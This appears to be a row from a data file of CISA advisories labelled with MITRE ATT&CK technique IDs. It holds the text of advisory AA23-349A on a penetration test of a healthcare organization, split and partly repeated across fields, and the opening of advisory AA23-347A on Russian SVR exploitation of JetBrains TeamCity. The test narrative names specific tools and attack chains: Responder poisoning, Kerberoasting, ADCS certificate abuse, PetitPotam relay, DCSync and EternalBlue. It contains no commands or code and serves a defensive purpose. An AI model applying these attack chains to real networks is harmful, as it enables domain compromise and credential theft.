These mitigations align with tactics provided in the joint guide Shifting the Balance of Cybersecurity Risk: Principles and Approaches for Secure by Design Software. CISA urges software manufacturers to take ownership of improving the security outcomes of their customers by applying these and other secure by design tactics. By using secure by design tactics, software manufacturers can make their product lines secure “out of the box” without requiring customers to spend additional resources making configuration changes, purchasing security software and logs, monitoring, and making routine updates.
For more information on secure by design, see CISA’s Secure by Design webpage. For more information on common misconfigurations and guidance on reducing their prevalence, see the joint advisory NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations.
VALIDATE SECURITY CONTROLS
In addition to applying the listed mitigations, CISA recommends exercising, testing, and validating your organization’s security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. CISA recommends testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Tables 7 – 16).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

CISA recommends continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
RESOURCES

For consolidated findings from the RVAs by Fiscal Year mapped to MITRE ATT&CK, see CISA’s Risk and Vulnerability Assessments page.
See joint CSA NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations for information on the most common cybersecurity misconfigurations in large organizations and TTPs actors use to exploit these misconfigurations.
See CISA’s Healthcare and Public Health Sector webpage.
See CISA’s RedEye tool on CISA’s GitHub page. RedEye is an interactive open-source analytic tool used to visualize and report red team command and control activities. See CISA’s RedEye tool overview video for more information.

REFERENCES
[1]   Github | kgretzky / evilginx[2]   Github | lgandx / Responder[3]   Network security LAN Manager authentication level - Windows Security | Microsoft Learn[4]   Service principal names - Win32 apps | Microsoft Learn[5]   Github | fortra / impacket6]   Github | byt3bl33d3r / CrackMapExec[7]   Github | ly4k / Certipy[8]   Github | topotam / PetitPotam[9]   Github | fortra / impacket / examples[10] Github | login-securite / DonPAPI[11] SP 800-63B, Digital Identity Guidelines: Authentication and Lifecycle Management | CSRC (nist.gov)
APPENDIX: MITRE ATT&CK TACTICS AND TECHNIQUES

Table 7: CISA Team ATT&CK Techniques for Reconnaissance


Reconnaissance
 
 


Technique Title
ID
Use




Active Scanning: Scanning IP Blocks
T1595.001
The CISA team first mapped the network to identify open web ports.




Table 8: CISA Team ATT&CK Techniques for Initial Access


Initial Access
 
 




Technique Title
ID
Use


Valid Accounts: Default Accounts
T1078.001
The CISA team did identify default credentials for multiple web interfaces during web application testing and used default printer credentials while penetration testing.


External Remote Services
T1133
The CISA team attempted to access various web interfaces with default administrator credentials.




Table 9: CISA Team ATT&CK Techniques for Execution


Execution
 
 


Technique Title
ID
Use




Command-Line Interface
T1059
The CISA team accessed a virtual machine interface enabling them to modify, power off, and/or delete critical virtual machines including domain controllers, file servers, and servers.


Command and Scripting Interpreter: Windows Command Shell
T1059.003
The CISA team used a webshell that allowed them to execute commands under the context of the local SYSTEM account.




Table 10: CISA Team ATT&CK Techniques for Privilege Escalation


Privilege Escalation
 
 


Technique Title
ID
Use




Valid Accounts: Domain Accounts
T1078.002
The CISA team used CrackMapExec to use ACCOUNT 1 to successfully connect to a domain controller (DC).




Table 11: CISA Team ATT&CK Techniques for Defense Evasion


Defense Evasion
 
 


Technique Title
ID
Use




Use Alternate Authentication Material
T1550
The CISA team authenticated to the domain controller as ACCOUNT 3 with the generated certificate.




Table 12: CISA Team ATT&CK Techniques for Credential Access


Credential Access
 
 


Technique Title
ID
Use




LLMNR/NBT-NS Poisoning and Relay
T1557.001
The CISA team initiated a LLMNR/NBT-NS/mDNS/DHCP poisoning tool to spoof a connection to the organization’s server for forced access.


Brute Force: Password Cracking
T1110.002
The CISA team cracked a service account with a weak password, giving them access to it.


Steal or Forge Kerberos Tickets: Kerberoasting
T1558.003
The CISA team gained access to domain accounts because any domain user can request a TGS ticket for domain accounts.


Adversary-in-the-Middle
T1557
The CISA team modified the “Save as file” configuration, to use File Transfer Protocol (FTP) instead of Server Message Block (SMB) and changed the Server Name and Network Path to point to a CISA-controlled machine running Responder.


Forced Authentication
T1187
The CISA team executed a “Connection Test” that sent the username and password over FTP.


Steal or Forge Authentication Certificates
T1649
The CISA team used Certipy to enumerate the ADCS certificate template vulnerabilities, allowing them to obtain certificates for different users.


OS Credential Dumping
T1003
The CISA team retrieved the NTLM hash for ACCOUNT 3.


Use Alternate Authentication Material: Pass the Hash
T1550.002
The CISA team used the hash to authenticate to the domain controller and validated Domain Administrator privileges, demonstrating compromise of the domain.


Brute Force: Password Spraying
T1110.003
The CISA team used a tool called CrackMapExec to spray easily guessable passwords across all domain accounts, giving them two sets of valid credentials.


Steal or Forge Kerberos Tickets
T1558
The CISA team used this certificate to acquire a TGT for ACCOUNT 5.


OS Credential Dumping: DCSync
T1003.006
The CISA team used DCSync to dump the NTLM hash for ACCOUNT 3 (a Domain Administrator account), effectively leading to domain compromise.


OS Credential Dumping: Security Account Manager
T1003.002
The CISA team dumped password hashes from a Security Account Manager (SAM) database.




Table 13: CISA Team ATT&CK Techniques for Discovery


Discovery
 
 


Technique Title
ID
Use




Network Sniffing
T1040
The CISA team spoofed a response to direct the victim host to a CISA-controlled machine on which Responder is running. 


Account Discovery: Domain Account
T1087.002
The CISA team enumerated accounts with a Service Principal Name (SPN) set with their domain access.


Network Service Scanning
T1046
The CISA team canned the organization’s network to identify open web ports to see where they could leverage the default credentials they had.




Table 14: CISA Team ATT&CK Techniques for Lateral Movement


Lateral Movement
 
 


Technique Title
ID
Use




Remote Services
T1021
The CISA team exploited its Responder to perform malicious functions, such as stealing credentials or opening a session on a targeted host.


 SMB/Windows Admin Shares
T1021.002
The CISA team confirmed they compromised the domain because ACCOUNT 1 had READ,WRITE permissions over the C$ administrative share.


Taint Shared Content
T1080
The CISA team found the device was configured with domain credentials to allow employees to save scanned documents to a network share.


Exploitation of Remote Services
T1210
The CISA team then executed a well-known EternalBlue exploit and established a shell on the server.




Table 15: CISA Team ATT&CK Techniques for Collection


Collection
 
 


Technique Title
ID
Use




Data from Network Shared Drive
T1039
The CISA team obtained credentials for cleartext, hashes, and from files.




Table 16: CISA Team ATT&CK Techniques for Impact


Collection
 
 


Technique Title
ID
Use




System Shutdown/Reboot
T1529
The CISA team assessed that with ACCOUNT 1, they could use it to modify, power off, and/or delete critical virtual machines, including domain controllers and file servers.



VERSION HISTORY
December 14, 2023: Initial version.






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1003.002', 'T1021.002', 'T1558.003', 'T1529', 'T1040', 'T1210', 'T1087.002', 'T1110.002', 'T1021', 'T1595.001', 'T1557', 'T1550.002', 'T1110.003', 'T1080', 'T1078.002', 'T1550', 'T1039', 'T1003', 'T1046', 'T1133', 'T1003.006', 'T1558', 'T1059', 'T1187', 'T1557.001', 'T1649', 'T1078.001', 'T1059.003'}","






Actions to take today to harden your internal environment to mitigate follow-on activity after initial access.




Use phishing-resistant multi-factor authentication (MFA) for all administrative access.
Verify the implementation of appropriate hardening measures, and change, remove, or deactivate all default credentials.
Implement network segregation controls.







SUMMARY
In January 2023, the Cybersecurity and Infrastructure Security Agency (CISA) conducted a Risk and Vulnerability Assessment (RVA) at the request of a Healthcare and Public Health (HPH) sector organization to identify vulnerabilities and areas for improvement. An RVA is a two-week penetration test of an entire organization, with one week spent on external testing and one week spent assessing the internal network. As part of the RVA, the CISA assessment team conducted web application, phishing, penetration, database, and wireless assessments. The assessed organization was a large organization deploying on-premises software.
During the one-week external assessment, the assessment team did not identify any significant or exploitable conditions in externally available systems that may allow a malicious actor to easily obtain initial access to the organization’s network. Furthermore, the assessment team was unable to gain initial access to the assessed organization through phishing. However, during internal penetration testing, the team exploited misconfigurations, weak passwords, and other issues through multiple attack paths to compromise the organization’s domain.
In coordination with the assessed organization, CISA is releasing this Cybersecurity Advisory (CSA) detailing the RVA team’s activities and key findings to provide network defenders and software manufacturers recommendations for improving their organizations’ and customers’ cyber posture, which reduces the impact of follow-on activity after initial access. CISA encourages the HPH sector and other critical infrastructure organizations deploying on-premises software, as well as software manufacturers, to apply the recommendations in the Mitigations section of this CSA to harden networks against malicious activity and to reduce the likelihood of domain compromise.
Download the PDF version of this report:


AA23-349A Enhancing Cyber Resilience: Insights from the CISA Healthcare and Public Health Sector Risk and Vulnerability Assessment
(PDF,       744.23 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK for Enterprise framework, version 14. See the MITRE ATT&CK Tactics and Techniques section for tables of the threat actors’ activity mapped to MITRE ATT&CK® tactics and techniques with corresponding mitigation and/or detection recommendations. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
Introduction
CISA has authority to, upon request, provide analyses, expertise, and other technical assistance to critical infrastructure owners and operators and provide operational and timely technical assistance to federal and non-federal entities with respect to cybersecurity risks. See generally 6 U.S.C. §§ 652(c)(5), 659(c)(6). After receiving a request for an RVA from the organization and coordinating high-level details of the engagement with certain personnel at the organization, CISA conducted the RVA in January 2023.
During RVAs, CISA tests the security posture of an organization’s network over a two-week period to determine the risk, vulnerability, and exploitability of systems and networks. During the first week (the external phase), the team tests public facing systems to identify exploitable vulnerabilities. During the second week (the internal phase), the team determines the susceptibility of the environment to an actor with internal access (e.g., malicious cyber actor or insider threat). The assessment team offers five services:

Web Application Assessment: The assessment team uses commercial and open source tools to identify vulnerabilities in public-facing and internal web applications, demonstrating how they could be exploited.
Phishing Assessment: The assessment team tests the susceptibility of staff and infrastructure to phishing attacks and determines what impact a phished user workstation could have on the internal network. The RVA team crafts compelling email pretexts and generates payloads, similar to ones used by threat actors, in order to provide a realistic threat perspective to the organization.
Penetration Testing: The assessment team tests the security of an environment by simulating scenarios an advanced cyber actor may attempt. The team’s goals are to establish a foothold, escalate privileges, and compromise the domain. The RVA team leverages both open source and commercial tools for host discovery, port and service mapping, vulnerability discovery and analysis, and vulnerability exploitation.
Database Assessment: The assessment team uses commercial database tools to review databases for misconfigurations and missing patches.
Wireless Assessment: The assessment team uses specialized wireless hardware to assess wireless access points, connected endpoints, and user awareness for vulnerabilities.

The assessed organization was in the HPH sector. See Table 1 for services in-scope for this RVA.

Phase I: External Assessment
Penetration and Web Application Testing
The CISA team did not identify any significant or exploitable conditions from penetration or web application testing that may allow a malicious actor to easily obtain initial access to the organization’s network.
Phishing Assessment
The CISA team conducted phishing assessments that included both user and systems testing.
The team’s phishing assessment was unsuccessful because the organization’s defensive tools blocked the execution of the team’s payloads. The payload testing resulted in most of the team’s payloads being blocked by host-based protections through a combination of browser, policy, and antivirus software. Some of the payloads were successfully downloaded to disk without being immediately removed, but upon execution, the antivirus software detected the malicious code and blocked it from running. Some payloads appeared to successfully evade host-based protections but did not create a connection to the command and control (C2) infrastructure, indicating they may have been incompatible with the system or blocked by border protections.
Since none of the payloads successfully connected to the assessment team’s C2 server, the team conducted a credential harvesting phishing campaign. Users were prompted to follow a malicious link within a phishing email under the pretext of verifying tax information and were then taken to a fake login form.
While twelve unique users from the organization submitted credentials through the malicious form, the CISA team was unable to leverage the credentials because they had limited access to external-facing resources. Additionally, the organization had multi-factor authentication (MFA) implemented for cloud accounts. Note: At the time of the assessment, the CISA team’s operating procedures did not include certain machine-in-the-middle attacks that could have circumvented the form of MFA in place. However, it is important to note that tools like Evilginx,1, can be leveraged to bypass non-phishing resistant forms of MFA. Furthermore, if a user executes a malicious file, opening a connection to a malicious actor’s command and control server, MFA will not prevent the actor from executing commands and carrying out actions under the context of that user.
Phase II: Internal Assessment
Database, Web Application, and Wireless Testing
The CISA assessment team did not identify any significant or exploitable conditions from database or wireless testing that may allow a malicious actor to easily compromise the confidentiality, integrity, and availability of the tested environment.
The team did identify default credentials, for multiple web interfaces during web application testing and used default printer credentials while penetration testing. (See the Attack Path 2 section for more information.)
Penetration Testing
The assessment team starts internal penetration testing with a connection to the organization’s network but without a valid domain account. The team’s goal is to compromise the domain by gaining domain admin or enterprise administrator-level permissions. Generally, the team first attempts to gain domain user access and then escalate privileges until the domain is compromised. This process is called the “attack path”—acquiring initial access to an organization and escalating privileges until the domain is compromised and/or vital assets for the organization are accessed. The attack path requires specialized expertise and is realistic to what adversaries may do in an environment.
For this assessment, the team compromised the organization’s domain through four unique attack paths, and in a fifth attack path the team obtained access to sensitive information.
See the sections below for a description of the team’s attack paths mapped to the MITRE ATT&CK for Enterprise framework. See the Findings section for information on issues that enabled the team to compromise the domain.
Attack Path 1
The assessment team initiated LLMNR/NBT-NS/mDNS/DHCP poisoning, with Responder,2, which works in two steps:

Responder listens to multicast name resolution queries (e.g., LLMNR UDP/5355, NBTNS UDP/137), and under the right conditions spoofs a response to direct the victim host to a CISA-controlled machine on which Responder is running.
Once a victim connects to the machine, Responder exploits the connection to perform malicious functions such as stealing credentials or opening a session on a targeted host,.

With this tool, the CISA team captured fifty-five New Technology Local Area Network Manager version 2 (NTLMv2) hashes, including the NTLMv2 hash for a service account. Note: NTLMv2 and other variations of the hash protocol are used for clients to join a domain, authenticate between Active Directory forests, authenticate between earlier versions of Windows operating systems (OSs), and authenticate computers that are not normally a part of the domain.,3, Cracking these passwords may enable malicious actors to establish a foothold in the domain and move laterally or elevate their privileges if the hash belongs to a privileged account.
The service account had a weak password, allowing the team to quickly crack it, and obtain access to the organization’s domain. With domain access, the CISA assessment team enumerated accounts with a Service Principal Name (SPN) set,. SPN is the unique service identifier used by Kerberos authentication,4, and accounts with SPN are susceptible to Kerberoasting.
The CISA team used Impacket’s,5, GetUserSPNs tool to request Ticket-Granting Service (TGS) tickets for all accounts with SPN set and obtained their Kerberos hashes,. Three of these accounts had domain administrator privileges—offline, the team cracked ACCOUNT 1 (which had a weak password).
Using CrackMapExec,6, the assessment team used ACCOUNT 1, to successfully connect to a domain controller (DC). The team confirmed they compromised the domain because ACCOUNT 1 had READ,WRITE permissions over the C$ administrative share, (see Figure 1).

 

Figure 1: ACCOUNT 1 Domain Admin Privileges

To further demonstrate the impact of compromising ACCOUNT 1, the assessment team used it to access a virtual machine interface. If a malicious actor compromised ACCOUNT 1, they could use it to modify, power off, and/or delete critical virtual machines, including domain controllers and file servers.
Attack Path 2
The team first mapped the network to identify open web ports, and then attempted to access various web interfaces, with default administrator credentials. The CISA team was able to log into a printer interface with a default password and found the device was configured with domain credentials to allow employees to save scanned documents to a network share,.
While logged into the printer interface as an administrator, the team 1) modified the “Save as file” configuration to use File Transfer Protocol (FTP) instead of Server Message Block (SMB) and 2) changed the Server Name and Network Path to point to a CISA-controlled machine running Responder,. Then, the team executed a “Connection Test” that sent the username and password over FTP, to the CISA machine running Responder, which captured cleartext credentials for a non-privileged domain account (ACCOUNT 2).
Using ACCOUNT 2 and Certipy,7, the team enumerated potential certificate template vulnerabilities found in Active Directory Certificate Services (ADCS). Note: ADCS templates are used to build certificates for different types of servers and other entities on an organization’s network. Malicious actors can exploit template misconfigurations, to manipulate the certificate infrastructure into issuing fraudulent certificates and/or escalate user privileges to a domain administrator.
The WebServer template was misconfigured to allow all authenticated users permission to:

Change the properties of the template (via Object Control Permissions with Write Property Principals set to Authenticated Users).
Enroll for the certificate (via Enrollment Permissions including the Authenticated Users group).
Request a certificate for a different user (via EnrolleeSuppliesSubject set as True).

See Figure 2 for the displayed certificate template misconfigurations.

 


The template’s Client Authentication was set to False, preventing the CISA assessment team from requesting a certificate that could be used to authenticate to a server in the domain. To demonstrate how this misconfiguration could lead to privilege escalation, the assessment team, leveraging its status as a mere authenticated user, briefly changed the WebServer template properties to set Client Authentication to True so that a certificate could be obtained for server authentication, ensuring the property was set back to its original setting of False immediately thereafter.
The team used Certipy with the ACCOUNT 2 credentials to request a certificate for a Domain Administrator account (ACCOUNT 3). The team then authenticated to the domain controller as ACCOUNT 3 with the generated certificate, and retrieved the NTLM hash for ACCOUNT 3,. The team used the hash to authenticate to the domain controller, and validated Domain Administrator privileges, demonstrating compromise of the domain via the WebServer template misconfiguration.
Attack Path 3
The CISA team used a tool called CrackMapExec to spray easily guessable passwords, across all domain accounts and obtained two sets of valid credentials for standard domain user accounts.
The assessment team leveraged one of the domain user accounts (ACCOUNT 4) to enumerate ADCS via Certipy and found that web enrollment was enabled (see Figure 3). If web enrollment is enabled, malicious actors can abuse certain services and/or misconfigurations in the environment to coerce a server to authenticate to an actor-controlled computer, which can relay the authentication to the ADCS web enrollment service and obtain a certificate for the server’s account (known as a relay attack).

 

Figure 3: Misconfigured ADCS Enumerated via Certipy

The team used PetitPotam,8, with ACCOUNT 4 credentials to force the organization’s domain controller to authenticate to the CISA-operated machine and then used Certipy to relay the coerced authentication attempt to the ADCS web enrollment service to receive a valid certificate for ACCOUNT 5, the domain controller machine account. They used this certificate to acquire a TGT, for ACCOUNT 5.
With the TGT for ACCOUNT 5, the CISA team used DCSync to dump the NTLM hash, for ACCOUNT 3 (a Domain Administrator account,see Attack Path 2 section,), effectively leading to domain compromise.
Attack Path 4
The CISA team identified several systems on the organization’s network that do not enforce SMB signing. The team exploited this misconfiguration to obtain cleartext credentials for two domain administrator accounts.
First, the team used Responder to capture the NTLMv2 hash for a domain administrator account. Next, they used Impacket’s NTLMrelayx tool,9, to relay the authentication for the domain administrator, opening a SOCKS connection on a host that did not enforce SMB signing. The team then used DonPAPI,10, to dump cleartext credentials through the SOCKS connection and obtained credentials for two additional domain administrator accounts.
The CISA team validated the privileges of these accounts by checking for READ,WRITE access on a domain controller C$ share, demonstrating Domain Administrator access and therefore domain compromise.
Attack Path 5
The team did vulnerability scanning, and identified a server vulnerable to CVE-2017-0144 (an Improper Input Validation,CWE-20, vulnerability known as “EternalBlue” that affects SMB version 1,SMBv1, and enables remote code execution,see Figure 4,).

 

Figure 4: Checking for EternalBlue Vulnerability

The CISA assessment team then executed a well-known EternalBlue exploit, and established a shell on the server. This shell allowed them to execute commands, under the context of the local SYSTEM account.
With this local SYSTEM account, CISA dumped password hashes from a Security Account Manager (SAM) database,. The team parsed the hashes and identified one for a local administrator account. Upon parsing the contents of the SAM database dump, the CISA team identified an NTLM hash for the local administrator account, which can be used to authenticate to various services.
The team sprayed the acquired NTLM hash across a network segment and identified multiple instances of password reuse allowing the team to access various resources including sensitive information with the hash.
Findings
Key Issues
The CISA assessments team identified several findings as potentially exploitable vulnerabilities that could compromise the confidentiality, integrity, and availability of the tested environment. Each finding, listed below, includes a description with supporting details. See the Mitigations section for recommendations on how to mitigate these issues.
The CISA team rated their findings on a severity scale from critical to informational (see Table 2).

The CISA assessment team identified four High severity vulnerabilities and one Medium severity vulnerability during penetration testing that contributed to the team’s ability to compromise the domain. See Table 3 for a list and description of these findings.

In addition to the issues listed above, the team identified three High and seven Medium severity findings. These vulnerabilities and misconfigurations may allow a malicious actor to compromise the confidentiality, integrity, and availability of the tested environment. See Table 4 for a list and description of these findings.

Additional Issues
The CISA team identified one Informational severity within the organization’s networks and systems. These issues may allow a malicious actor to compromise the confidentiality, integrity, and availability of the tested environment, but are not readily exploitable. The information provided is to encourage the stakeholder to investigate these issues further to adjust their environments or eliminate certain aspects as needed, but the urgency is low.

Noted Strengths
The CISA team noted the following business, technical, and administrative components that enhanced the network security posture of the tested environment:

The organization’s network was found to have several strong, security-oriented characteristics such as:

Effective antivirus software;
Endpoint detection and response capabilities;
Good policies and best practices for protecting users from malicious files including not allowing users to mount ISO files;
Minimal external attack surface, limiting an adversary’s ability to leverage external vulnerabilities to gain initial access to the organization’s networks and systems;
Strong wireless protocols;
And network segmentation.


The organization’s security also demonstrated their ability to detect some of the CISA team's actions throughout testing and overall situational awareness through the use of logs and alerts.
The organization used MFA for cloud accounts. The assessment team obtained cloud credentials via a phishing campaign but was unable to use them because of MFA prompts.

MITIGATIONS
Network Defenders
CISA recommends HPH Sector and other critical infrastructure organizations implement the mitigations in Table 6 to mitigate the issues listed in the Findings section of this advisory. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.

Additionally, CISA recommends that HPH sector organizations implement the following strategies to mitigate cyber threats:

Mitigation Strategy #1 Asset Management and Security:

CISA recommends that HPH sector organizations implement and maintain an asset management policy to reduce the risk of exposing vulnerabilities, devices, or services that could be exploited by threat actors to gain unauthorized access, steal sensitive data, or disrupt critical services. The focus areas for this mitigation strategy include asset management and asset security, addressing asset inventory, procurement, decommissioning, and network segmentation as they relate to hardware, software, and data assets.


Mitigation Strategy #2 Identity Management and Device Security:

CISA recommends entities secure their devices and digital accounts and manage their online access to protect sensitive data and PII/PHI from compromise. The focus areas for this mitigation strategy include email security, phising prevention, access management, password policies, data protection and loss prevention, and device logs and monitoring solutions.


Mitigation Strategy #3 Vulnerability, Patch, and Configuration Management:

CISA recommends entities mitigate known vulnerabilities and establish secure configuration baselines to reduce the likelihood of threat actors exploiting known vulnerabilities to breach organizational networks. The focus areas for this mitigation strategy include vulnerability and patch Management, and configuration and change management.



For more information on these mitigations strategies, see CISA’s Healthcare and Public Health Sector webpage.
Software Manufacturers
The above mitigations apply to HPH sector and other critical infrastructure organizations with on-premises or hybrid environments. Recognizing that insecure software is the root cause of the majority of these flaws, and that the responsibility should not be on the end user, CISA urges software manufacturers to implement the following to reduce the prevalence of misconfigurations, weak passwords, and other weaknesses identified and exploited through the assessment team:

Embed security into product architecture throughout the entire software development lifecycle (SDLC).
Eliminate default passwords. Do not provide software with default passwords. To eliminate default passwords, require administrators set a “strong” password,CPG 2.B, during installation and configuration.
Create secure configuration templates. Provide configuration templates with certain safe settings based on an organization’s risk appetite (e.g., low, medium, and high security templates). Support these templates with hardening guides based on the risks the manufacturer has identified. The default configuration should be a secure one, and organizations should need to opt in if they desire a less secure configuration.
Design products so that the compromise of a single security control does not result in compromise of the entire system. For example, narrowly provision user privileges by default and employ ACLs to reduce the impact of a compromised account. This will make it more difficult for a malicious cyber actor to escalate privileges and move laterally.
Mandate MFA, ideally phishing-resistant MFA, for privileged users and make MFA a default, rather than opt-in, feature.

These mitigations align with tactics provided in the joint guide Shifting the Balance of Cybersecurity Risk: Principles and Approaches for Secure by Design Software. CISA urges software manufacturers to take ownership of improving the security outcomes of their customers by applying these and other secure by design tactics. By using secure by design tactics, software manufacturers can make their product lines secure “out of the box” without requiring customers to spend additional resources making configuration changes, purchasing security software and logs, monitoring, and making routine updates.
For more information on secure by design, see CISA’s Secure by Design webpage. For more information on common misconfigurations and guidance on reducing their prevalence, see the joint advisory NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations.
VALIDATE SECURITY CONTROLS
In addition to applying the listed mitigations, CISA recommends exercising, testing, and validating your organization’s security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. CISA recommends testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Tables 7 – 16).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

CISA recommends continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
RESOURCES

For consolidated findings from the RVAs by Fiscal Year mapped to MITRE ATT&CK, see CISA’s Risk and Vulnerability Assessments page.
See joint CSA NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations for information on the most common cybersecurity misconfigurations in large organizations and TTPs actors use to exploit these misconfigurations.
See CISA’s Healthcare and Public Health Sector webpage.
See CISA’s RedEye tool on CISA’s GitHub page. RedEye is an interactive open-source analytic tool used to visualize and report red team command and control activities. See CISA’s RedEye tool overview video for more information.

REFERENCES,1,   Github | kgretzky / evilginx,2,   Github | lgandx / Responder,3,   Network security LAN Manager authentication level - Windows Security | Microsoft Learn,4,   Service principal names - Win32 apps | Microsoft Learn,5,   Github | fortra / impacket6,   Github | byt3bl33d3r / CrackMapExec,7,   Github | ly4k / Certipy,8,   Github | topotam / PetitPotam,9,   Github | fortra / impacket / examples,10, Github | login-securite / DonPAPI,11, SP 800-63B, Digital Identity Guidelines: Authentication and Lifecycle Management | CSRC (nist.gov)
APPENDIX: MITRE ATT&CK TACTICS AND TECHNIQUES










VERSION HISTORY
December 14, 2023: Initial version.






This product is provided subject to this Notification and this Privacy & Use policy.


","['T1213', 'T1119', 'T1553', 'T1568', 'T1068', 'T1531', 'T1007', 'T1587', 'T1597', 'T1550', 'T1558', 'T1087', 'T1027', 'T1535', 'T1039', 'T1069', 'T1649', 'T1610', 'T1608', 'T1591', 'T1078', 'T1555', 'T1021', 'T1221', 'T1114', 'T1003']","{'T1539', 'T1557.001', 'T1588.002', 'T1003.003', 'T1078.002', 'T1046', 'T1204.002', 'T1561', 'T1018', 'T1595.002', 'T1111', 'T1492', 'T1484.001', 'T1598.004', 'T1566.001', 'T1589.001', 'T1558.003', 'T1187', 'T1059.003', 'T1556.005', 'T1558.002', 'T1003.002', 'T1003.006', 'T1200', 'T1562.001', 'T1040', 'T1087.002', 'T1550.002', 'T1562.002', 'T1557.003', 'T1550.003', 'T1110', 'T1588.006', 'T1552.001', 'T1070.004', 'T1078.001', 'T1021.002', 'T1597.001', 'T1548.005', 'T1649', 'T1530', 'T1556.006', 'T1110.002', 'T1552.004', 'T1190', 'T1110.003', 'T1534', 'T1078', 'T1598.003'}","{'T1539', 'T1557.001', 'T1588.002', 'T1578.005', 'T1046, T1595.002', 'T1003.003', 'T1078.002', 'T1046', 'T1204.002', 'T1018', 'T1111', 'T1595.002', 'T1069.002', 'T1482', 'T1598.004', 'T1566.001', 'T1082', 'T1078, T1078.002', 'T1187', 'T1558.003', 'T1068', 'T1059.003', 'T1499.004', 'T1110.001', 'T1222.001', 'T1556.005', 'T1007', 'T1558.002', 'T1102', 'T1588.005', 'T1072', 'T1105', 'T1003.002', 'T1003.006', 'T1200', 'T1492, T1494, T1565.001, T1565.003, T1565, T1565.002, T1493', 'T1040', 'T1484', 'T1203', 'T1087.002', 'T1553.004', 'T1550.002', 'T1562.002', 'T1557.003', 'T1550.003', 'T1171', 'T1558.001', 'T1110', 'T1588.006', 'T1552.001', 'T1021.002', 'T1078.001', 'T1480.001', 'T1484.002', 'T1597.001', 'T1548.005', 'T1649', 'T1012', 'T1556.006', 'T1110.002', 'T1195', 'T1530', 'T1190', 'T1110.003', 'T1534', 'T1078', 'T1598.003', 'T1109', 'T1518.001'}","{'T1070, T1562, T1203, T1135', 'T1078, T1190, T1203', 'T1589', 'T1204, T1078, T1556, T1567, T1083', 'T1212', 'T1222', 'T1552, T1550', 'T1589, T1566, T1204', 'T1552, T1557', 'T1203, T1071', 'T1090', 'T1557', 'T1078, T1078.003, T1078.004', 'T1078, T1098', 'T1078, T1068', 'T1553', 'T1078, T1069, T1003', 'T1204, T1566', 'T0862', 'T0886', 'T1566, T1589', 'T1552', 'T1068', 'T1204', 'T1531', 'T1003, T1078, T1070', 'T1059', 'T1588', 'T1200', 'T1550', 'T1558', 'T1602', 'T1040', 'T1598', 'T1203', 'T1589, T1071', 'T1556, T1552', 'T1566, T1078', 'T1609', 'T1595, T1566, T1587, T1555, T1078', 'T1557, T1550', 'T1566', 'T1078, T1210, T1069', 'T1078, T1003, T1083', 'T1210, T1078', 'T1110', 'T1580', 'T1071', 'T1556', 'T1595, T1203', 'T1110, T1550', 'T1190', 'T1046, T1135, T1203', 'T1534', 'T1078, T1021', 'T1078, T1046', 'T1078', 'T1201', 'T1078, T1078.003', 'T1557, T1558, T1550, T1555, T1552', 'T1550, T1078', 'T1562', 'T1207', 'T0883', 'T1566, T1204', 'T1003'}"
8,https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-347a,"



SUMMARY
The U.S. Federal Bureau of Investigation (FBI), U.S. Cybersecurity & Infrastructure Security Agency (CISA), U.S. National Security Agency (NSA), Polish Military Counterintelligence Service (SKW), CERT Polska (CERT.PL), and the UK’s National Cyber Security Centre (NCSC) assess Russian Foreign Intelligence Service (SVR) cyber actors—also known as Advanced Persistent Threat 29 (APT 29), the Dukes, CozyBear, and NOBELIUM/Midnight Blizzard—are exploiting CVE-2023-42793 at a large scale, targeting servers hosting JetBrains TeamCity software since September 2023.
Software developers use TeamCity software to manage and automate software compilation, building, testing, and releasing. If compromised, access to a TeamCity server would provide malicious actors with access to that software developer’s source code, signing certificates, and the ability to subvert software compilation and deployment processes—access a malicious actor could further use to conduct supply chain operations. Although the SVR used such access to compromise SolarWinds and its customers in 2020, limited number and seemingly opportunistic types of victims currently identified, indicate that the SVR has not used the access afforded by the TeamCity CVE in a similar manner. The SVR has, however, been observed using the initial access gleaned by exploiting the TeamCity CVE to escalate its privileges, move laterally, deploy additional backdoors, and take other steps to ensure persistent and long-term access to the compromised network environments.
To bring Russia’s actions to public attention, the authoring agencies are providing information on the SVR’s most recent compromise to aid organizations in conducting their own investigations and securing their networks, provide compromised entities with actionable indicators of compromise (IOCs), and empower private sector cybersecurity companies to better detect and counter the SVR’s malicious actions. The authoring agencies recommend all organizations with affected systems that did not immediately apply available patches or workarounds to assume compromise and initiate threat hunting activities using the IOCs provided in this CSA. If potential compromise is detected, administrators should apply the incident response recommendations included in this CSA and report key findings to the FBI and CISA.
Download the PDF version of this report:


AA23-347A Russian Foreign Intelligence Service (SVR) Exploiting JetBrains TeamCity CVE Globally
(PDF,       774.65 KB
  )


